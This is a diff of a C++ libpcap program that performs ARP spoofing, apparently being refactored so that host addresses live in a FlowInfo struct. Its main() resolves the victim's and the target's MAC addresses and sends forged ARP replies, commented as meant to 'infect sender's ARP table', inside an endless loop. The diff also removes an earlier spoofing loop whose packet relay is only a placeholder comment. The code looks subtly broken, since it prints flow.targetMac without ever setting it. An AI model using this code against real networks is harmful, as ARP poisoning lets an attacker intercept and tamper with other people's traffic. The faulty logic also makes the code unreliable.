@@ -1,30 +1,5 @@
 #include "main.h"
 
-void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt)
-{
-	struct pcap_pkthdr *header;
-	const u_char *packet;
-	std::thread sendArpThread(continueSendArp, handle, pkt, 10);
-	while (true)
-	{
-		int result = pcap_next_ex(handle, &header, &packet);
-		if (result == 0)
-			continue;
-		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
-		{
-			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
-			break;
-		}
-
-		if (isRefreshed(handle, pkt))
-			sendArp(handle, pkt);
-		// else
-		/*relay function*/
-	}
-
-	sendArpThread.detach();
-}
-
 int main(int argc, char *argv[])
 {
 	FlowInfo flow;
@@ -46,10 +21,10 @@ int main(int argc, char *argv[])
 		char *dev = argv[1];
 		const char *interfaceName = argv[1];
 
-		Ip attackerIp;
-		Mac attackerMac;
+		// Ip attackerIp;
+		// Mac attackerMac;
 
-		getHostInfo(interfaceName, &attackerIp, &attackerMac);
+		getHostInfo(interfaceName, &flow.attackerIp, &flow.attackerMac);
 
 		// Open pcap handle
 		char errbuf[PCAP_ERRBUF_SIZE];
@@ -63,27 +38,27 @@ int main(int argc, char *argv[])
 		printf("[*] get sender Info..");
 		printf("\n----------------------------------------\n");
 
-		Ip senderIp = Ip(argv[iter]);
-		Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
-		printf("[+] senderIp    : %s\n", std::string(senderIp).c_str());
-		printf("[+] senderMac   : %s\n", std::string(senderMac).c_str());
+		flow.senderIp = Ip(argv[iter]);
+		flow.senderMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.senderIp);
+		printf("[+] senderIp    : %s\n", std::string(flow.senderIp).c_str());
+		printf("[+] senderMac   : %s\n", std::string(flow.senderMac).c_str());
 
 		printf("\n----------------------------------------\n");
 		printf("[*] get target Info..");
 		printf("\n----------------------------------------\n");
 
-		Ip targetIp = Ip(argv[iter + 1]);
-		Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
-		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
-		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
+		flow.targetIp = Ip(argv[iter + 1]);
+		Mac targetMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.targetIp);
+		printf("[+] targetIp    : %s\n", std::string(flow.targetIp).c_str());
+		printf("[+] targetMac   : %s\n", std::string(flow.targetMac).c_str());
 
 		// Send ARP Reply packet to infect sender's ARP table
-		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp);
+		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, flow.senderMac, flow.attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, flow.attackerMac, flow.targetIp, flow.senderMac, flow.senderIp);
 		sendArp(handle, pkt);
 
 		while (true)
 		{
-			spoofProcess(ArpHdr::Reply, handle, pkt);
+			spoofProcess(ArpHdr::Reply, handle, pkt, flow);
 		}
 
 		pcap_close(handle);
